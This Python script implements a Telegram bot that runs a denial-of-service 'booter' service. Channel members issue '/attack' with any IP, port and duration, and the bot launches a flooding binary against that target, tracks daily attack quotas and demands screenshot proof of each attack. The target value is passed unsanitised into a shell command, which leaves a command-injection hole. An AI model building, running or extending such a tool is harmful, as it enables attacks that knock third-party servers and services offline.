#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import random
import threading
import os
import logging
from config import BOT_TOKEN, ADMIN_ID, CHANNEL_USERNAME, FEEDBACK_CHANNEL, ALLOWED_GROUPS

# Initialize logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Initialize bot with token from config
bot = telebot.TeleBot(BOT_TOKEN)

# Verify feedback channel exists
try:
    bot.get_chat(FEEDBACK_CHANNEL)
    logger.info(f"Feedback channel {FEEDBACK_CHANNEL} is accessible")
except Exception as e:
    logger.error(f"ERROR: Feedback channel {FEEDBACK_CHANNEL} not accessible: {e}")
    exit(1)

# Configuration Settings
COOLDOWN_TIME = 0  # Cooldown in seconds
ATTACK_LIMIT = 10  # Max attacks per day
SCREENSHOT_TIMEOUT = 300  # 5 minutes in seconds
BAN_DURATION = 1800  # 30 minutes in seconds
global_last_attack_time = None
pending_feedback = {}  
pending_screenshot = {}  
active_attacks = {}  # Track currently running attacks

# File Management
USER_FILE = "users.txt"
ALLOWED_GROUPS_FILE = "allowed_groups.txt"
user_data = {}

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                parts = line.strip().split(',')
                user_id = parts[0]
                user_data[user_id] = {
                    'attacks': int(parts[1]),
                    'last_reset': datetime.datetime.fromisoformat(parts[2]),
                    'last_attack': datetime.datetime.fromisoformat(parts[3]) if parts[3] != 'None' else None,
                    'attack_blocked_until': float(parts[4]) if len(parts) > 4 and parts[4] != 'None' else 0
                }
        logger.info(f"Loaded {len(user_data)} users from {USER_FILE}")
    except FileNotFoundError:
        logger.warning(f"User file {USER_FILE} not found, starting fresh")
    except Exception as e:
        logger.error(f"Error loading users: {e}")

def save_users():
    try:
        with open(USER_FILE, "w") as file:
            for user_id, data in user_data.items():
                last_attack = data['last_attack'].isoformat() if data['last_attack'] else 'None'
                blocked_until = str(data.get('attack_blocked_until', 0)) if data.get('attack_blocked_until', 0) > 0 else 'None'
                file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()},{last_attack},{blocked_until}\n")
        logger.info(f"Saved {len(user_data)} users to {USER_FILE}")
    except Exception as e:
        logger.error(f"Error saving users: {e}")

def load_allowed_groups():
    try:
        with open(ALLOWED_GROUPS_FILE, "r") as file:
            groups = [line.strip() for line in file]
            logger.info(f"Loaded {len(groups)} groups from {ALLOWED_GROUPS_FILE}")
            return groups
    except FileNotFoundError:
        logger.info(f"Using default allowed groups from config")
        return ALLOWED_GROUPS
    except Exception as e:
        logger.error(f"Error loading allowed groups: {e}")
        return ALLOWED_GROUPS

def save_allowed_groups():
    try:
        with open(ALLOWED_GROUPS_FILE, "w") as file:
            for group_id in allowed_groups:
                file.write(f"{group_id}\n")
        logger.info(f"Saved {len(allowed_groups)} groups to {ALLOWED_GROUPS_FILE}")
    except Exception as e:
        logger.error(f"Error saving allowed groups: {e}")

allowed_groups = load_allowed_groups()

def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logger.error(f"Error checking channel membership: {e}")
        return False

def send_attack_message(chat_id, message, photo_file_id=None):
    styles = [
        "🟢🔵🟣⚫⚪🟤🔴🟠🟡🟢🔵",
        "✦⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅✦⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅✦",
        "┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅",
        "▁▂▃▄▅▆▇█▓▒░▒▓█▇▆▅▄▃▂▁",
        "✦•·················•✦•·············•✦",
        "⚡•»»————⍟————««•⚡•»»————⍟————««•⚡",
        "▄︻デ══━一••••••••••••••••••••••••••••••一━══デ︻▄"
    ]
    border = random.choice(styles)
    full_msg = f"{border}\n{message}\n{border}"
    
    try:
        if photo_file_id:
            bot.send_photo(chat_id, photo_file_id, caption=full_msg, parse_mode="HTML")
        else:
            bot.send_message(chat_id, full_msg, parse_mode="HTML")
    except Exception as e:
        logger.error(f"Error sending message: {e}")

@bot.message_handler(commands=['check'])
def check_attack_status(message):
    user_id = str(message.from_user.id)
    group_id = str(message.chat.id)
    
    # Check if user is blocked from attacking
    if user_data.get(user_id, {}).get('attack_blocked_until', 0) > time.time():
        remaining = user_data[user_id]['attack_blocked_until'] - time.time()
        mins, secs = divmod(int(remaining), 60)
        
        send_attack_message(message.chat.id,
            f"╔═��══════════════════════════════╗\n"
            f"║ 🚫 ATTACK ACCESS BLOCKED 🚫 ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 Reason: Failed to provide screenshot proof\n"
            f"🔸 Block time remaining: {mins}m {secs}s\n\n"
            f"⚠️ You can still chat but cannot launch attacks\n"
            f"⏳ Block expires at: {datetime.datetime.fromtimestamp(user_data[user_id]['attack_blocked_until']).strftime('%H:%M:%S')}")
        return
    
    # Check if user has any active attack
    if user_id in active_attacks:
        attack_data = active_attacks[user_id]
        elapsed = time.time() - attack_data['start_time']
        remaining = max(0, attack_data['duration'] - elapsed)
        
        # Get user details
        try:
            user = bot.get_chat_member(group_id, user_id).user
            username = f"@{user.username}" if user.username else user.first_name
        except:
            username = "Unknown User"
        
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"║ ⏳ ATTACK IN PROGRESS ⏳ ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 <b>Attacker:</b> <code>{username}</code>\n"
            f"🔸 <b>Target:</b> <code>{attack_data['target']}</code>\n"
            f"🔹 <b>Time Remaining:</b> <code>{int(remaining)} seconds</code>\n\n"
            f"⚠️ Screenshot required within {max(0, SCREENSHOT_TIMEOUT - elapsed):.0f}s")
    elif pending_feedback.get(user_id, False):
        elapsed = time.time() - pending_screenshot[user_id]['start_time']
        remaining = max(0, SCREENSHOT_TIMEOUT - elapsed)
        
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"║ 📸 PENDING SCREENSHOT 📸 ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 You have a completed attack\n"
            f"🔸 Please send screenshot proof\n\n"
            f"⏳ <b>Time remaining:</b> <code>{int(remaining)} seconds</code>\n"
            f"⚠️ After timeout: 30 minute attack block")
    else:
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"║ ℹ️ NO ACTIVE ATTACKS ℹ️ ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 You don't have any active attacks\n"
            f"🔸 Start new attack with /attack")

@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    
    if pending_feedback.get(user_id, False):
        try:
            # Forward screenshot to feedback channel
            bot.forward_message(FEEDBACK_CHANNEL, message.chat.id, message.message_id)
            
            # Clear pending status and active attack
            pending_feedback[user_id] = False
            pending_screenshot[user_id] = False
            active_attacks.pop(user_id, None)
            
            # Notify user
            send_attack_message(message.chat.id,
                "╔════════════════════════════════╗\n"
                "║ ✅ SCREENSHOT VERIFIED ✅ ║\n"
                "╚════════════════════════════════╝\n\n"
                "🔹 Your attack proof has been recorded!\n"
                "🔸 You can now launch new attacks\n\n"
                f"⏳ Next attack available: <b>Now</b>")
            
            # Notify admin
            for admin in ADMIN_ID:
                try:
                    bot.send_message(admin, 
                        f"📸 New screenshot received\n"
                        f"From: {message.from_user.first_name}\n"
                        f"ID: {user_id}\n"
                        f"Group: {message.chat.title if message.chat.title else 'Private'}")
                except Exception as e:
                    logger.error(f"Error notifying admin: {e}")
                    
            logger.info(f"Processed screenshot from user {user_id}")
            
        except Exception as e:
            logger.error(f"Error handling screenshot: {e}")
            send_attack_message(message.chat.id,
                "╔════════════════════════════════╗\n"
                "║ ❌ SCREENSHOT ERROR ❌ ║\n"
                "╚════════════════════════════════╝\n\n"
                "🔹 Please try sending again\n"
                "🔸 Contact admin if problem persists")
    else:
        send_attack_message(message.chat.id,
            "╔════════════════════════════════╗\n"
            "║ ℹ️ NO PENDING ATTACKS ℹ️ ║\n"
            "╚════════════════════════════════╝\n\n"
            "🔹 You don't have any attacks requiring screenshots\n"
            "🔸 Start an attack first with /attack")

def check_screenshot_timeout(user_id, group_id):
    """Check if user sent screenshot within timeout period"""
    start_time = pending_screenshot.get(user_id, {}).get('start_time', time.time())
    time_left = SCREENSHOT_TIMEOUT - (time.time() - start_time)
    
    if time_left > 0:
        time.sleep(time_left)
    
    if pending_feedback.get(user_id, False):
        try:
            # Block attack access instead of banning
            if user_id not in user_data:
                user_data[user_id] = {
                    'attacks': 0,
                    'last_reset': datetime.datetime.now(),
                    'last_attack': None,
                    'attack_blocked_until': time.time() + BAN_DURATION
                }
            else:
                user_data[user_id]['attack_blocked_until'] = time.time() + BAN_DURATION
            save_users()
            
            send_attack_message(group_id,
                f"╔════════════════════════════════╗\n"
                f"║ 🚫 ATTACK ACCESS BLOCKED 🚫 ║\n"
                f"╚════════════════════════════════╝\n\n"
                f"🔹 User ID: <code>{user_id}</code>\n"
                f"🔸 Duration: 30 minutes\n"
                f"🔹 Reason: Failed to provide attack proof\n\n"
                f"⚠️ You can still chat but cannot launch attacks\n"
                f"⏳ Block expires at: {datetime.datetime.fromtimestamp(time.time() + BAN_DURATION).strftime('%H:%M:%S')}")
            logger.info(f"Blocked attack access for user {user_id}")
        except Exception as e:
            logger.error(f"Error in screenshot check: {e}")
        finally:
            pending_feedback[user_id] = False
            pending_screenshot[user_id] = False
            active_attacks.pop(user_id, None)

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    username = f"@{message.from_user.username}" if message.from_user.username else "N/A"
    group_id = str(message.chat.id)

    # Check if user is blocked from attacking
    if user_data.get(user_id, {}).get('attack_blocked_until', 0) > time.time():
        remaining = user_data[user_id]['attack_blocked_until'] - time.time()
        mins, secs = divmod(int(remaining), 60)
        
        send_attack_message(message.chat.id,
            f"╔══════════════���═════════════════╗\n"
            f"║ 🚫 ATTACK ACCESS BLOCKED 🚫 ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 Reason: Failed to provide screenshot proof\n"
            f"🔸 Block time remaining: {mins}m {secs}s\n\n"
            f"⚠️ You can still chat but cannot launch attacks\n"
            f"⏳ Block expires at: {datetime.datetime.fromtimestamp(user_data[user_id]['attack_blocked_until']).strftime('%H:%M:%S')}")
        return

    # Pre-attack checks
    if group_id not in allowed_groups:
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"║ 🚫 ACCESS DENIED 🚫 ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 This bot is exclusive to authorized groups\n"
            f"🔸 Join our channel: {CHANNEL_USERNAME}")
        return

    if not is_user_in_channel(user_id):
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"║ ❗ CHANNEL REQUIRED ❗ ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 You must join our channel first!\n"
            f"🔸 {CHANNEL_USERNAME}")
        return

    if pending_feedback.get(user_id, False):
        send_attack_message(message.chat.id,
            "╔════════════════════════════════╗\n"
            "║ 😡 PENDING SCREENSHOT 😡 ║\n"
            "╚════════════════════════════════╝\n\n"
            "🔹 You must send screenshot from previous attack!\n"
            "🔸 Upload your screenshot now!\n\n"
            f"⚠️ Time remaining: {SCREENSHOT_TIMEOUT - (time.time() - pending_screenshot[user_id]['start_time']):.0f}s")
        return

    # Check if user already has an active attack
    if user_id in active_attacks:
        send_attack_message(message.chat.id,
            "╔════════════════════════════════╗\n"
            "║ ⚠️ ATTACK IN PROGRESS ⚠️ ║\n"
            "╚════════════════════════════════╝\n\n"
            f"🔹 Hey {user_name}, one attack at a time!\n"
            f"🔸 Wait for current attack to finish\n\n"
            f"⏳ Estimated completion: {active_attacks[user_id]['duration']}s remaining")
        return

    # Attack initiation
    command = message.text.split()
    if len(command) != 4:
        send_attack_message(message.chat.id,
            "╔════════════════════════════════╗\n"
            "║ ⚠️ INVALID FORMAT ⚠️ ║\n"
            "╚════════════════════════════════╝\n\n"
            "🔹 <code>/attack</code> <i>&lt;IP&gt; &lt;PORT&gt; &lt;TIME&gt;</i>\n"
            "🔸 Example: <code>/attack 1.1.1.1 80 60</code>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
        if time_duration > 120:
            send_attack_message(message.chat.id,
                "╔════════════════════════════════╗\n"
                "║ 🚫 TIME LIMIT EXCEEDED 🚫 ║\n"
                "╚════════════════════════════════╝\n\n"
                "🔹 Maximum attack duration: 120 seconds\n"
                "🔸 Please try with lower time value")
            return
    except ValueError:
        send_attack_message(message.chat.id,
            "╔════════════════════════════════╗\n"
            "║ ❌ INVALID INPUT ❌ ║\n"
            "╚════════════════════════════════╝\n\n"
            "🔹 Port and time must be numbers\n"
            "🔸 Example: <code>/attack 1.1.1.1 80 60</code>")
        return

    # Profile picture check
    try:
        profile_photos = bot.get_user_profile_photos(user_id)
        if profile_photos.total_count == 0:
            send_attack_message(message.chat.id,
                "╔════════════════════════════════╗\n"
                "║ ❌ PROFILE PIC REQUIRED ❌ ║\n"
                "╚════════════════════════════════╝\n\n"
                "🔹 You must set a profile picture first!\n"
                "🔸 Update your Telegram profile and try again")
            return
            
        photo_file_id = profile_photos.photos[0][-1].file_id
        
        # Initialize user data if not exists
        if user_id not in user_data:
            user_data[user_id] = {
                'attacks': 0,
                'last_reset': datetime.datetime.now(),
                'last_attack': None,
                'attack_blocked_until': 0
            }
        
        # Check daily attack limit
        if user_data[user_id]['attacks'] >= ATTACK_LIMIT:
            send_attack_message(message.chat.id,
                "╔════════════════════════════════╗\n"
                "║ 🚫 DAILY LIMIT REACHED 🚫 ║\n"
                "╚════════════════════════════════╝\n\n"
                f"🔹 You've used all {ATTACK_LIMIT} attacks today\n"
                f"🔸 Daily limit resets in {time_until_reset(user_id)}")
            return
            
        # Start attack process
        launch_attack(message, target, port, time_duration, user_id, user_name, username, photo_file_id, group_id)
        
    except Exception as e:
        logger.error(f"Error getting profile photo: {e}")
        send_attack_message(message.chat.id,
            "╔════════════════════════════════╗\n"
            "║ ❌ PROFILE PHOTO ERROR ❌ ║\n"
            "╚════════════════════════════════╝\n\n"
            "🔹 Please try again later\n"
            "🔸 Contact admin if problem persists")

def launch_attack(message, target, port, time_duration, user_id, user_name, username, photo_file_id, group_id):
    """Launch attack with all checks passed"""
    attack_msg = (
        f"╔════════════════════════════════╗\n"
        f"║ ⚡ ATTACK INITIATED ⚡ ║\n"
        f"╚════════════════════════════════╝\n\n"
        f"🔸 <b>Commander:</b> <code>{user_name}</code>\n"
        f"🔹 <b>Username:</b> <code>{username}</code>\n\n"
        f"╔═════════════════════════════╗\n"
        f"║ 🎯 <b>Target:</b> <code>{target}:{port}</code>\n"
        f"║ ⏳ <b>Duration:</b> <code>{time_duration}s</code>\n"
        f"║ 💥 <b>Power:</b> <code>800</code>\n"
        f"╚═════════════════════════════╝\n\n"
        f"⚠️ <b>SCREENSHOT REQUIRED WITHIN 5 MINUTES</b> ⚠️\n"
        f"⏰ <i>Timeout at: {(datetime.datetime.now() + datetime.timedelta(seconds=SCREENSHOT_TIMEOUT)).strftime('%H:%M:%S')}</i>"
    )
    
    # Send attack initiation message
    send_attack_message(message.chat.id, attack_msg, photo_file_id)
    
    # Mark attack as active
    active_attacks[user_id] = {
        'start_time': time.time(),
        'duration': time_duration,
        'target': f"{target}:{port}"
    }
    
    # Set pending flags
    pending_feedback[user_id] = True
    pending_screenshot[user_id] = {
        'start_time': time.time(),
        'group_id': group_id
    }
    
    # Start attack in background
    threading.Thread(target=execute_attack, args=(message, target, port, time_duration, user_id, group_id)).start()
    logger.info(f"Attack started by {user_id} on {target}:{port} for {time_duration}s")
    
    # Start screenshot timeout check
    threading.Thread(target=check_screenshot_timeout, args=(user_id, group_id)).start()

def execute_attack(message, target, port, time_duration, user_id, group_id):
    """Execute the actual attack command"""
    try:
        # Simulate attack (replace with actual command)
        subprocess.run(f"./Rahul {target} {port} {time_duration}", shell=True, check=True)
        
        # Update user data
        user_data[user_id]['attacks'] += 1
        user_data[user_id]['last_attack'] = datetime.datetime.now()
        save_users()
        
        # Send completion message if screenshot not already handled
        if pending_feedback.get(user_id, False):
            remaining_attacks = ATTACK_LIMIT - user_data[user_id]['attacks']
            send_attack_message(message.chat.id,
                f"╔════════════════════════════════╗\n"
                f"║ ✅ ATTACK COMPLETED ✅ ║\n"
                f"╚════════════════════════════════╝\n\n"
                f"🔹 Target: <code>{target}:{port}</code>\n"
                f"🔸 Duration: <code>{time_duration}s</code>\n"
                f"🔹 Remaining Attacks: <code>{remaining_attacks}/{ATTACK_LIMIT}</code>\n\n"
                f"⚠️ Please send screenshot of attack proof within 5 minutes!")
                
    except subprocess.CalledProcessError as e:
        logger.error(f"Attack failed for {user_id}: {e}")
        send_attack_message(message.chat.id, 
            f"╔════════════════════════════════╗\n"
            f"║ ❌ ATTACK FAILED ❌ ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 Error: <code>{e}</code>\n"
            f"🔸 Please try again later")
    finally:
        # Clean up after attack completes
        active_attacks.pop(user_id, None)

def time_until_reset(user_id):
    """Calculate time until daily reset"""
    now = datetime.datetime.now()
    last_reset = user_data[user_id]['last_reset']
    next_reset = last_reset + datetime.timedelta(days=1)
    time_left = next_reset - now
    
    hours, remainder = divmod(time_left.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{hours}h {minutes}m {seconds}s"
    
@bot.message_handler(commands=['check'])
def check_attack_status(message):
    group_id = str(message.chat.id)
    
    # Get all active attacks in this group
    active_in_group = []
    for user_id, attack_data in active_attacks.items():
        if pending_screenshot.get(user_id, {}).get('group_id') == group_id:
            elapsed = time.time() - attack_data['start_time']
            remaining = max(0, attack_data['duration'] - elapsed)
            
            try:
                user = bot.get_chat_member(group_id, user_id).user
                username = f"@{user.username}" if user.username else user.first_name
            except:
                username = f"User {user_id}"
                
            active_in_group.append({
                'username': username,
                'target': attack_data['target'],
                'remaining': remaining,
                'screenshot_time_left': max(0, SCREENSHOT_TIMEOUT - elapsed)
            })
    
    # Format the message
    if active_in_group:
        attack_list = "\n\n".join([
            f"⚔️ <b>Attacker:</b> <code>{attack['username']}</code>\n"
            f"🎯 <b>Target:</b> <code>{attack['target']}</code>\n"
            f"⏳ <b>Time Left:</b> <code>{int(attack['remaining'])}s</code>\n"
            f"📸 <b>Screenshot Due:</b> <code>{int(attack['screenshot_time_left'])}s</code>"
            for attack in active_in_group
        ])
        
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"║ ⚡ ACTIVE GROUP ATTACKS ⚡ ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"{attack_list}\n\n"
            f"🔹 Total Attacks: {len(active_in_group)}")
    else:
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"║ ℹ️ NO ACTIVE ATTACKS ℹ️ ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 Currently no active attacks in this group\n"
            f"🔸 Start new attack with /attack")

def auto_reset():
    """Reset attack counters daily"""
    while True:
        now = datetime.datetime.now()
        for user_id, data in list(user_data.items()):
            if (now - data['last_reset']).days >= 1:
                data['attacks'] = 0
                data['last_reset'] = now
                data['attack_blocked_until'] = 0
                save_users()
                logger.info(f"Reset attack counter for user {user_id}")
        time.sleep(86400)  # Sleep for 1 day

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🏁 START THE BOT 🏁
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
if __name__ == "__main__":
    load_users()
    threading.Thread(target=auto_reset, daemon=True).start()
    
    print("""
    ╔════════════════════════════════╗
    ║       BOT STARTED SUCCESS      ║
    ╚════════════════════════════════╝
    """)
    logger.info("Bot starting...")
    
    retry_count = 0
    MAX_RETRIES = 5
    
    while True:
        try:
            bot.polling(none_stop=True, interval=3, timeout=20)
            retry_count = 0
        except Exception as e:
            retry_count += 1
            if retry_count > MAX_RETRIES:
                logger.error(f"Max retries reached. Restarting...")
                retry_count = 0
                
            wait_time = min(2 ** retry_count, 60)
            logger.error(f"Polling error: {e}\nRetrying in {wait_time} seconds...")
            time.sleep(wait_time)